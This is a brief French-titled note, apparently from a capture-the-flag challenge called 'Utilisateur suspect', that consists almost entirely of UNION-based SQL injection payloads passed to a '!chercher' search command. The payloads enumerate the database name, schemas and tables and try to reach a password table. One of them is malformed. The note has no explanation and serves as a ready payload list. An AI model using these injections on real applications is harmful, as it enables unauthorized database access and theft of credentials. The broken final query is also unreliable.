# Utilisateur suspect 1/2

Basic SQL Injection

```
!chercher *" union select database()-- -
!chercher *" union select schema_name from information_schema.schemata-- -
!chercher cn" UNION select TABLE_NAME from INFORMATION_SCHEMA.TABLES where table_schema="data"-- -
!chercher " union select from password-- -
```
